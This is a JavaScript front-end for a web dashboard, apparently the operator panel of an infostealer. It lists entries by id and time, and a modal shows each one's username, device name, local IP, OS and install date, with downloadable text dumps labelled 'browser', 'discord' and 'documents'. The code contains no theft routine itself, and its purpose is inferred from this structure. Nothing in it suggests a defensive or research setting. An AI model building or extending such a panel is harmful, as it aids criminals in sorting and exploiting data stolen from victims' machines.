let DATA = null;
let CURRENT = null;

const $ = (selector) => document.querySelector(selector);
const $$ = (selector) => document.querySelectorAll(selector);

async function loadData() {
  const res = await fetch('../data.json', { cache: 'no-store' });
  if (!res.ok) throw new Error('data.json konnte nicht geladen werden');
  return await res.json();
}

function safeText(v) {
  return v === null || v === undefined ? '' : String(v);
}

function downloadTextFile(filename, content) {
  const blob = new Blob([content ?? ''], { type: 'text/plain;charset=utf-8' });
  const url = URL.createObjectURL(blob);

  const a = document.createElement('a');
  a.href = url;
  a.download = filename || 'download.txt';
  document.body.appendChild(a);
  a.click();
  a.remove();

  URL.revokeObjectURL(url);
}

function renderRows(items) {
  const tbody = $('#tbody');
  tbody.innerHTML = '';

  items.forEach((item) => {
    const row = document.createElement('div');
    row.className = 'row';

    const userCell = document.createElement('div');
    const userLink = document.createElement('span');
    userLink.className = 'user-link';
    userLink.textContent = item.id;
    userLink.addEventListener('click', () => openModal(item.id));
    userCell.appendChild(userLink);

    row.appendChild(userCell);

    const timeCell = document.createElement('div');
    timeCell.textContent = formatTimeAgo(item.postedAt);
    row.appendChild(timeCell);

    const entriesCell = document.createElement('div');
    entriesCell.textContent = safeText(item.entries);
    row.appendChild(entriesCell);

    tbody.appendChild(row);
  });
}

function renderKV(systemInfo) {
  const sys = $('#sysInfo');
  sys.innerHTML = '';

  const entries = [
    ['Username:', systemInfo?.username],
    ['Device Name:', systemInfo?.deviceName],
    ['Local IP:', systemInfo?.localIp],
    ['OS:', systemInfo?.os],
    ['Install Date:', systemInfo?.installDate],
  ];

  entries.forEach(([k, v]) => {
    const kEl = document.createElement('div');
    kEl.className = 'k';
    kEl.textContent = k;
    sys.appendChild(kEl);

    const vEl = document.createElement('div');
    vEl.className = 'v';
    vEl.textContent = safeText(v);
    sys.appendChild(vEl);
  });
}

function renderFileList(container, files) {
  container.innerHTML = '';

  if (!files || files.length === 0) {
    const empty = document.createElement('div');
    empty.className = 'file-box empty-box';
    empty.textContent = '—';
    container.appendChild(empty);
    return;
  }

  files.forEach((file) => {
    const box = document.createElement('div');
    box.className = 'file-box';

    const header = document.createElement('div');
    header.className = 'file-box-header';

    const name = document.createElement('div');
    name.className = 'file-name';
    name.textContent = file.title || 'Text';
    header.appendChild(name);

    const btn = document.createElement('button');
    btn.className = 'btn-link';
    btn.type = 'button';
    btn.textContent = 'Download';
    btn.addEventListener('click', () => {
      downloadTextFile(
        file.downloadName || `${file.title || 'text'}.txt`,
        file.content || ''
      );
    });
    header.appendChild(btn);

    box.appendChild(header);

    const content = document.createElement('pre');
    content.className = 'file-box-content';
    content.textContent = safeText(file.content);
    box.appendChild(content);

    container.appendChild(box);
  });
}

function openModal(id) {
  const item = DATA?.items?.find((x) => x.id === id);
  if (!item) return;

  CURRENT = item;

  $('#modalTitle').textContent = item.id;
  renderKV(item.systemInfo || {});
  renderFileList($('#filesBrowser'), item.files?.browser);
  renderFileList($('#filesDiscord'), item.files?.discord);
  renderFileList($('#filesDocuments'), item.files?.documents);

  const backdrop = $('#modalBackdrop');
  backdrop.setAttribute('aria-hidden', 'false');
  requestAnimationFrame(() => {
    backdrop.classList.add('open');
  });

  document.body.style.overflow = 'hidden';
}

function closeModal() {
  const backdrop = $('#modalBackdrop');
  backdrop.classList.remove('open');
  backdrop.setAttribute('aria-hidden', 'true');
  CURRENT = null;
  document.body.style.overflow = '';
}

function applySearch(query) {
  const q = query.trim().toLowerCase();
  const items = DATA?.items ?? [];
  if (!q) return renderRows(items);

  const filtered = items.filter(
    (item) =>
      item.id.toLowerCase().includes(q) ||
      (item.systemInfo?.username ?? '').toLowerCase().includes(q) ||
      (item.systemInfo?.deviceName ?? '').toLowerCase().includes(q)
  );

  renderRows(filtered);
}

async function init() {
  DATA = await loadData();
  renderRows(DATA.items ?? []);

  const searchInput = $('#searchInput');
  searchInput.addEventListener('input', function () {
    applySearch(this.value);
  });

  $('#closeBtn').addEventListener('click', closeModal);

  $('#modalBackdrop').addEventListener('click', (e) => {
    if (e.target.id === 'modalBackdrop') closeModal();
  });

  window.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') closeModal();
  });
}

document.addEventListener('DOMContentLoaded', async () => {
  try {
    await init();
  } catch (err) {
    console.error(err);
    $(
      '#tbody'
    ).innerHTML = `<div style="padding:12px;color:#686868">data.json konnte nicht geladen werden.</div>`;
  }
});

initTheme();

function initTheme() {
  const saved = localStorage.getItem('theme');
  const themeToggle = $('#themeToggle');

  if (saved === 'dark') {
    document.body.classList.add('dark');
    themeToggle.textContent = 'Light';
  }

  themeToggle.addEventListener('click', () => {
    const isDark = document.body.classList.toggle('dark');

    if (isDark) {
      localStorage.setItem('theme', 'dark');
      themeToggle.textContent = 'Light';
    } else {
      localStorage.setItem('theme', 'light');
      themeToggle.textContent = 'Dark';
    }
  });
}

function formatTimeAgo(timestamp) {
  const ts = Number(timestamp); // wichtig
  const seconds = Math.floor((Date.now() - ts) / 1000);

  if (seconds < 5) return 'just now';
  if (seconds < 60) return `${seconds} seconds ago`;

  const minutes = Math.floor(seconds / 60);
  if (minutes === 1) return '1 minute ago';
  if (minutes < 60) return `${minutes} minutes ago`;

  const hours = Math.floor(minutes / 60);
  if (hours === 1) return '1 hour ago';
  if (hours < 24) return `${hours} hours ago`;

  const days = Math.floor(hours / 24);
  if (days === 1) return '1 day ago';
  if (days < 30) return `${days} days ago`;

  const months = Math.floor(days / 30);
  if (months === 1) return '1 month ago';
  if (months < 12) return `${months} months ago`;

  const years = Math.floor(months / 12);
  if (years === 1) return '1 Year ago';

  return `${years} years ago`;
}
